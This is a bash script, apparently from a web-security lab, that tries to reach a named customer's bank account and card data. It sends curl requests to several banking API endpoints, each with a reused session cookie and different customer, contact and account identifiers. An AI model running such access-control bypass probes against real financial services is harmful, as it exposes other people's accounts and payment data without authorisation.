#!/bin/bash

BASE="http://web0x06.hbtn"
SESSION="TwsxhFuA3MROYn0tQ8WUux-FVvM4UWtEcCfqDuA8GPY.AqT-CQMU8CLKrI_RMM2MiZnxyiw"

HEADERS=(
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0'
  -H 'Accept: */*'
  -H 'Accept-Language: en-US,en;q=0.9'
  -H 'Accept-Encoding: gzip, deflate'
  -H 'Referer: http://web0x06.hbtn/dashboard'
  -H 'Origin: http://web0x06.hbtn'
  -H 'Connection: keep-alive'
  -H "Cookie: session=$SESSION"
  -H 'Priority: u=4'
  -H 'content-type: application/json'
)

# Megan White - primary target per report
# customer_id = 4330c51555c940ebb605914edd8da53d
# contact_id  = 4330c51555c940ebb605914edd8da53d  (same here)
# account numbers: 107134244322, 103801431323

echo "=== Try /api/accounts/ with customer_id body ==="
curl -s "$BASE/api/accounts/" -X POST "${HEADERS[@]}" \
  --data-raw '{"customer_id":"4330c51555c940ebb605914edd8da53d"}' | python3 -m json.tool

echo ""
echo "=== Try /api/accounts with customer_id body ==="
curl -s "$BASE/api/accounts" -X POST "${HEADERS[@]}" \
  --data-raw '{"customer_id":"4330c51555c940ebb605914edd8da53d"}' | python3 -m json.tool

echo ""
echo "=== Try /api/accounts/info with customer_id instead of accounts_id ==="
curl -s "$BASE/api/accounts/info" -X POST "${HEADERS[@]}" \
  --data-raw '{"customer_id":"4330c51555c940ebb605914edd8da53d"}' | python3 -m json.tool

echo ""
echo "=== Try /api/customer/accounts with customer_id ==="
curl -s "$BASE/api/customer/accounts" -X POST "${HEADERS[@]}" \
  --data-raw '{"customer_id":"4330c51555c940ebb605914edd8da53d"}' | python3 -m json.tool

echo ""
echo "=== Try account number directly (102367163623 from report) ==="
curl -s "$BASE/api/accounts/info" -X POST "${HEADERS[@]}" \
  --data-raw '{"account_number":"102367163623"}' | python3 -m json.tool

echo ""
echo "=== Try /api/accounts/info with number field ==="
curl -s "$BASE/api/accounts/info" -X POST "${HEADERS[@]}" \
  --data-raw '{"number":"107134244322"}' | python3 -m json.tool

echo ""
echo "=== Try contact_id values (different from customer_id) ==="
# contact_ids from original JSON
for cid in "4330c51555c940ebb605914edd8da53d" "a498775f450a4c7c9f85d93411cfd0f2" "2b7f7229531747c98cb175933aa0ea06"; do
  echo "--- contact_id: $cid ---"
  curl -s "$BASE/api/accounts/info" -X POST "${HEADERS[@]}" \
    --data-raw "{\"contact_id\":\"$cid\"}" | python3 -m json.tool
done

echo ""
echo "=== Try /api/cards/info with contact_id ==="
curl -s "$BASE/api/cards/info" -X POST "${HEADERS[@]}" \
  --data-raw '{"customer_id":"4330c51555c940ebb605914edd8da53d"}' | python3 -m json.tool
